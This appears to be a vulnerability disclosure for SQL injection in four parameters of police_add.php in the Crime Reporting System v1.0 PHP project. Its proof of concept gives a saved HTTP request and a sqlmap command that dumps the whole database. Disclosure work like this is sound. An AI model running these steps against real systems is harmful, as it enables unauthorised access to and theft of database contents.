# Crime Reporting System - SQL Injection (Police Add)

### Vendor Homepage:

> https://code-projects.org/

### Software Link:

> [Crime Reporting System](https://code-projects.org/crime-reporting-system-in-php-with-source-code/)

### Version:

> v 1.0

### SQL Injection:

> SQL injection is a type of security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. Usually, it involves the insertion or "injection" of a SQL query via the input data from the client to the application. A successful SQL injection exploit can read sensitive data from the database, modify database data (Insert/Update/Delete), execute administration operations on the database (such as shutdown the DBMS), recover the content of a given file present on the DBMS file system, and in some cases, issue commands to the operating system.

### Affected Components:

> /Crime-Reporting-System/police_add.php

> Four parameters `police_name` , `police_id` , `police_spec` and `password` within police_add.php are vulnerable to SQL Injection.


![police_name](https://github.com/jxp98/VulResearch/blob/main/2024/02/img/1.3crs-policeadd-policename-sqli.png)

![police_id](https://github.com/jxp98/VulResearch/blob/main/2024/02/img/1.4crs-policeadd-policeid-sqli.png)

![police_spec](https://github.com/jxp98/VulResearch/blob/main/2024/02/img/1.5crs-policeadd-policespec-sqli.png)

![password](https://github.com/jxp98/VulResearch/blob/main/2024/02/img/1.6crs-policeadd-password-sqli.png)

### Description:

> The presence of SQL Injection in the application enables attackers to issue direct queries to the database through specially crafted requests.

## Proof of Concept:

### SQLMap

Save the following request to `police_add.txt`:

```
POST /Crime-Reporting-System/police_add.php HTTP/1.1
Host: 172.16.8.56
Content-Length: 67
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://172.16.8.56
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://172.16.8.56/Crime-Reporting-System/police_add.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: PHPSESSID=83m3g3m53f33hm6so30ku7lng6
Connection: close

police_name=123&police_id=123&police_spec=123&password=123&s=Submit
```

Use `sqlmap` with `-r` option to exploit the vulnerability:

```
sqlmap -r police_add.txt --level 5 --risk 3 --batch --dbms MYSQL --dump
```


## Recommendations

When using this Crime Reporting System, it is essential to update the application code to ensure user input sanitization and proper restrictions for special characters.
